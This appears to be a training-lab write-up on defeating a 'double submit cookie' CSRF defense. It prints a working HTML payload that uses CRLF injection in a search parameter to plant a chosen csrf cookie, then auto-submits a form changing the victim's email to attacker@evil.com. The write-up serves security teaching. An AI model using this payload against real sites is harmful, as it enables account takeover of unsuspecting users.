# Lab 6: CSRF where token is duplicated in cookie

**Difficulty:** Practitioner

## Goal

Change the victim's email with a CSRF attack. The app uses a "double submit cookie" defense - it checks that the `csrf` body parameter equals the `csrf` cookie - but never validates that the token is genuine.

## Exploit

Inject a `csrf` cookie with any value, then submit the form with the same value in the body. Cookie equals body, so the check passes.

```html
<img src="https://LAB-ID.web-security-academy.net/?search=x%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="submitForm()">

<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf" value="fake" />
</form>
<script>function submitForm(){ document.forms[0].submit(); }</script>
```

## Why it works

The defense only compares two values for equality; it never checks either is a real, session-bound token. Combined with the same cookie-injection vector as Lab 5 (search reflects input into `Set-Cookie`, CRLF injects a header), the attacker controls both copies:

- `<img>` injects `csrf=fake` as a cookie
- the form submits `csrf=fake` in the body
- body == cookie, so validation passes

No valid token is needed - both copies are attacker-chosen.

## Takeaway

Double-submit-cookie is only sound if the value is unpredictable and the cookie cannot be set by an attacker. When any endpoint allows cookie injection, matching two attacker-controlled copies proves nothing.
